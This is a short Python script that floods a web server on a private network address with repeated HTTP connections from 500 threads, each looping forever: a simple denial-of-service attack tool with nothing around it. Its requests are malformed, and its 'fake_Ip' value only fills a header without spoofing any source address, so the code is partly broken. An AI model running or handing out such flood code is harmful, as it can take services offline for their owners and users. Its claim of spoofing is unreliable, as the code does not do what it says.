import threading
import socket

target = "192.168.0.18"
port = 80
fake_Ip = "192.168.0.220"

def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target,port))
		s.sendto(("GET " + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host " + fake_Ip + "\r\n\r\n").encode('ascii'), (target, port))
		s.close()
		
for i in range(500):
	threads = threading.Thread(target=attack)
	threads.start()
